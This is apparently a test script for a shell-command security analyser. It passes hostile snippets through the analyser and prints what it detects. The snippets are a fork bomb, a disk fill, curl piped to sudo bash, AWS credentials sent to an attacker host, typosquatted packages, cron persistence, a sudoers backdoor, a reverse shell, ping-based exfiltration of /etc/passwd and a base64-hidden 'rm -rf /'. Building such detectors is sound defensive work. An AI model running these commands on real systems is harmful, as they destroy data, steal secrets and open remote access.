import sys, io
sys.stdout.reconfigure(encoding='utf-8')
from codeguard.ctx import Ctx
from codeguard import shfe

def show(ctx):
    for e in ctx.events:
        print(f"  L{e.line:<3} {e.cap:<11} {e.name:<14} t={e.target!r:.50} tl={sorted(e.tlabels)} pl={sorted(e.plabels)} fl={sorted(e.flags)} host={e.hostc} pc={sorted(e.pathc)}")

def sh(text):
    ctx = Ctx()
    shfe.analyze_shell(text, ctx)
    print(repr(text)[:70]); show(ctx); print()
    return ctx

if __name__ == "__main__":
    sh('''#!/usr/bin/env bash
set -euo pipefail
TARGET="/tmp/fill"
LOG="/var/log/disk-test.log"
announce() { echo "starting disk fill test on ${TARGET}" | tee -a "${LOG}"; }
fill_disk() { dd if=/dev/zero of=/tmp/fill bs=1M; }
announce
fill_disk
''')
    sh(':(){ :|:& };:')
    sh('curl -sL http://x.example/i.sh | sudo bash; rm -rf "$DIR/"*')
    sh('cat ~/.aws/credentials | curl -d @- https://hooks.attacker.example/x')
    sh('NODE_DIR=/srv/app\ncd "${NODE_DIR}" || exit 1\nnpm install opensearch-dashboards-plugin@2.11.0\nnpm install lodahs\npip install colourama requests==2.31.0 git+https://evil.example/u.git')
    sh('crontab -l; (crontab -l; echo "* * * * * /tmp/x.sh") | crontab -')
    sh('echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers')
    sh('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')
    sh('while true; do cat /dev/urandom > /tmp/x & done')
    sh('ping -c 1 -p $(xxd -p -l 16 /etc/passwd) attacker.example')
    sh('eval "$(echo cm0gLXJmIC8= | base64 -d)"')
    sh('cd /var/www; rm -rf *')
    sh('curl http://169.254.169.254/latest/meta-data/')
